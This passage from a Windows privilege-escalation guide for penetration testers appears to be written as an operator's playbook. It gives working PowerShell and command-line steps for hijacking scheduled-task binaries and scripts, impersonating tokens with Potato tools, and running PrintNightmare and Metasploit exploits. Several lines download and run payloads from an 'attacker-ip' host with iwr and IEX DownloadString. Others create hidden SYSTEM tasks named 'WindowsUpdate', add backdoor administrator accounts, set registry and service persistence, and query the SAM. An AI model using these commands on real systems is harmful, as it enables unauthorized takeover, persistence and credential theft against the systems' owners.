            $acl = Get-Acl $action.Execute -ErrorAction SilentlyContinue
            $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
            
            $hasWriteAccess = $acl.Access | Where-Object {
                ($_.IdentityReference -eq $currentUser -or 
                 $_.IdentityReference -eq "BUILTIN\Users" -or
                 $_.IdentityReference -eq "NT AUTHORITY\Authenticated Users") -and
                ($_.FileSystemRights -match "FullControl|Modify|Write")
            }
            
            if ($hasWriteAccess) {
                Write-Output "WRITABLE: $($action.Execute)"
            }
        }
    }
}

# Test specific task
Test-TaskExecutablePermissions "TaskName"
```

**Directory permission analysis:**
```powershell
# Check if task executable directory is writable
Get-ScheduledTask | ForEach-Object {
    $actions = Get-ScheduledTaskAction $_.TaskName -ErrorAction SilentlyContinue
    foreach ($action in $actions) {
        if ($action.Execute) {
            $directory = Split-Path $action.Execute -Parent
            if ($directory -and (Test-Path $directory)) {
                $acl = Get-Acl $directory -ErrorAction SilentlyContinue
                if ($acl.Access | Where-Object {
                    $_.IdentityReference -eq "BUILTIN\Users" -and 
                    $_.FileSystemRights -match "Write|FullControl"
                }) {
                    Write-Output "Writable directory: $directory for task $($_.TaskName)"
                }
            }
        }
    }
}
```

### Exploitation Techniques

**Binary replacement method:**
```powershell
# 1. Backup original executable
$taskAction = Get-ScheduledTaskAction "VulnerableTask"
$originalExe = $taskAction.Execute
Copy-Item $originalExe "$originalExe.backup"

# 2. Replace with malicious binary (use standard payload from section 2.1)
iwr -uri http://attacker-ip/malicious.exe -Outfile malicious.exe
Move-Item malicious.exe $originalExe

# 3. Wait for task execution or trigger manually
Start-ScheduledTask "VulnerableTask"

# 4. Verify privilege escalation (see section 1.2 for enumeration)
Get-LocalUser | Where-Object Name -eq "newuser"
```

**Script hijacking method:**
```powershell
# For tasks executing scripts
$scriptPath = "C:\Scripts\cleanup.ps1"

# Backup original script
Copy-Item $scriptPath "$scriptPath.backup"

# Create malicious script (using standard payload pattern)
$maliciousScript = @"
# Add user and grant admin privileges (standard pattern from section 2.1)
net user backdoor Password123! /add
net localgroup administrators backdoor /add

# Execute original functionality to avoid detection
& "$scriptPath.backup"
"@

$maliciousScript | Out-File $scriptPath -Encoding ASCII
```

### Advanced Exploitation

**DLL hijacking in scheduled tasks:**
```powershell
# If task executable loads DLLs from its directory
$taskPath = "C:\Program Files\Application\"

# Check for missing DLLs using Process Monitor
# Create malicious DLL and place in application directory
iwr -uri http://attacker-ip/malicious.dll -Outfile "$taskPath\missing.dll"
```

**Argument injection:**
```powershell
# If task uses user-controllable arguments
$task = Get-ScheduledTask "VulnerableTask"
$action = Get-ScheduledTaskAction $task.TaskName

# Analyze current arguments
Write-Output "Current arguments: $($action.Arguments)"

# Modify task to include malicious arguments (if permissions allow)
$newAction = New-ScheduledTaskAction -Execute $action.Execute -Argument "malicious_args"
Set-ScheduledTask -TaskName $task.TaskName -Action $newAction
```

### PowerUp Integration

**Automated scheduled task analysis:**
```powershell
# Import PowerUp
IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/PowerUp.ps1')

# Find vulnerable scheduled tasks
Get-ModifiableScheduledTaskFile

# Check for unquoted paths in tasks
Get-UnquotedService | Where-Object {$_.ServiceName -like "*Task*"}
```

### Manual Task Creation

**Create persistence task (if permissions allow):**
```powershell
# Create action
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command 'IEX (New-Object Net.WebClient).DownloadString(\"http://attacker-ip/payload.ps1\")'"

# Create trigger (daily at logon)
$trigger = New-ScheduledTaskTrigger -AtLogOn

# Create principal (run as SYSTEM if possible)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount

# Register task
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Principal $principal -Description "Windows Update Check"
```

## 3.2 Using Exploits

Exploits targeting Windows vulnerabilities can provide direct privilege escalation paths. This section covers application exploits, kernel exploits, and privilege abuse techniques.

### Types of Privilege Escalation Exploits

**1. Application-Based Vulnerabilities**
- Third-party software running with elevated privileges
- Vulnerable system applications
- Service exploitation

**2. Windows Kernel Exploits**
- Direct kernel vulnerability exploitation
- Memory corruption bugs
- Logic flaws in kernel components

**3. Privilege Abuse**
- Misuse of assigned Windows privileges
- Token manipulation
- Impersonation attacks

### Kernel Exploit Methodology

**System reconnaissance:**
```powershell
# Get Windows version and build (see section 1.2 for full systeminfo usage)
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Check installed patches
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" } | Sort-Object InstalledOn
wmic qfe list brief
Get-HotFix | Sort-Object InstalledOn
```

**Privilege assessment:**
```powershell
# Current user privileges (core commands from section 1.2)
whoami /priv
whoami /all

# Check for specific exploitation privileges
whoami /priv | findstr "SeImpersonate\|SeDebug\|SeBackup\|SeRestore\|SeLoad\|SeTakeOwnership"
```

**Vulnerability research process:**
1. Identify Windows version and build number
2. Cross-reference with CVE databases
3. Check for available public exploits
4. Verify patch status
5. Test in controlled environment first

### Common Windows Privileges for Escalation

**SeImpersonatePrivilege:**
```powershell
# Check if current user has impersonation privilege
whoami /priv | findstr "SeImpersonatePrivilege"

# Common accounts with this privilege:
# - IIS_IUSRS
# - LOCAL SERVICE
# - NETWORK SERVICE  
# - SERVICE accounts
```

**SeDebugPrivilege:**
```powershell
# Allows debugging any process (including SYSTEM processes)
# Can be used to inject code into privileged processes

# Check for debug privilege
whoami /priv | findstr "SeDebugPrivilege"
```

**SeBackupPrivilege:**
```powershell
# Allows backing up any file (bypassing ACLs)
# Can read sensitive files like SAM database

# Check for backup privilege
whoami /priv | findstr "SeBackupPrivilege"
```

### Token Impersonation Techniques

**Named Pipe Impersonation:**
```powershell
# Concept: Coerce privileged process to connect to controlled named pipe
# Tools: RottenPotato, JuicyPotato, PrintSpoofer, SigmaPotato

# Download and use SigmaPotato
iwr -uri http://attacker-ip/SigmaPotato.exe -Outfile SigmaPotato.exe

# Execute command as SYSTEM (using standard payload pattern)
.\SigmaPotato.exe "net user backdoor Password123! /add"
.\SigmaPotato.exe "net localgroup administrators backdoor /add"

# Alternative: Get SYSTEM shell
.\SigmaPotato.exe "powershell -Command Start-Process cmd -Verb RunAs"
```

**Advanced impersonation tools:**
```powershell
# JuicyPotato (older Windows versions)
.\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}

# PrintSpoofer (newer Windows versions)
.\PrintSpoofer.exe -i -c cmd

# GodPotato (Windows Server 2019/2022)
.\GodPotato.exe -cmd "cmd /c whoami"
```

### Application Exploit Techniques

**Vulnerable service exploitation:**
```powershell
# Identify running services and versions
Get-WmiObject win32_service | Where-Object {$_.State -eq "Running"} | Select-Object Name, PathName, StartName

# Check for known vulnerable applications
$knownVulnApps = @("VNC", "TeamViewer", "FileZilla", "Putty")
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | 
    Where-Object { $knownVulnApps -contains $_.DisplayName } |
    Select-Object DisplayName, DisplayVersion
```

**Memory corruption exploitation:**
```powershell
# Buffer overflow in privileged applications
# Use tools like Metasploit or custom exploits

# Example: Exploiting vulnerable service
# 1. Identify buffer overflow vulnerability
# 2. Generate shellcode payload
# 3. Craft exploit to overwrite return address
# 4. Execute with elevated privileges
```

### Kernel Exploit Examples

**CVE-2021-1675 (PrintNightmare):**
```powershell
# Check if Print Spooler service is running
Get-Service Spooler

# Download and execute exploit
iwr -uri http://attacker-ip/CVE-2021-1675.exe -Outfile printnightmare.exe
.\printnightmare.exe
```

**Local privilege escalation exploits:**
```powershell
# Common Windows 10/11 kernel exploits:
# - CVE-2023-29360 (Windows Streaming Service)
# - CVE-2022-21882 (Windows Kernel)
# - CVE-2021-1732 (Windows Kernel)
# - CVE-2020-17087 (Windows Kernel CNG.SYS)

# General exploitation process:
# 1. Download compiled exploit
# 2. Transfer to target system
# 3. Execute and verify privilege escalation
# 4. Establish persistence if needed
```

### Exploit Safety and Considerations

**Pre-exploitation checklist:**
```powershell
# 1. Backup critical system files
# 2. Verify exploit compatibility
# 3. Test in isolated environment
# 4. Have system recovery plan
# 5. Coordinate with client IT team
```

**System stability verification:**
```powershell
# Check system resources before exploitation
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
Get-Counter "\Memory\Available MBytes"
Get-EventLog -LogName System -Newest 10 -EntryType Error
```

### Automated Exploit Frameworks

**Metasploit integration:**
```bash
# On Kali Linux
msfconsole
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
exploit
```

**PowerShell exploitation frameworks:**
```powershell
# PowerSploit
IEX (New-Object Net.WebClient).DownloadString('http://attacker-ip/PowerSploit.ps1')

# Empire/Starkiller
# PowerShell Empire for post-exploitation

# Covenant C2 framework  
# .NET based command and control
```

### Exploit Mitigation Bypass

**ASLR/DEP bypass techniques:**
```powershell
# Address Space Layout Randomization bypass
# Data Execution Prevention bypass
# Return Oriented Programming (ROP)
# Jump Oriented Programming (JOP)

# Check current mitigation status
Get-ProcessMitigation -Name "process.exe"

# Windows Defender bypass
# AMSI bypass techniques
# ETW bypass methods
```

### Post-Exploitation Verification

**Confirm privilege escalation:**
```powershell
# Verify new privileges (core commands from section 1.2)
whoami
whoami /priv
whoami /groups

# Test administrative access (standard pattern)
net user testuser Password123! /add
net localgroup administrators testuser /add

# Access protected resources
dir C:\Windows\System32\config
reg query HKLM\SAM
```

**Establish persistence:**
```powershell
# Create backdoor user (standard pattern throughout guide)
net user backdoor Password123! /add
net localgroup administrators backdoor /add
net localgroup "Remote Desktop Users" backdoor /add

# Registry persistence
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command <payload>"

# Service persistence
sc create "WindowsUpdate" binpath= "cmd.exe /c <payload>" start= auto
```

---

*Note: This completes the comprehensive Windows Privilege Escalation guide. Each section provides detailed technical commands, examples, and methodologies for effective privilege escalation on Windows systems.*
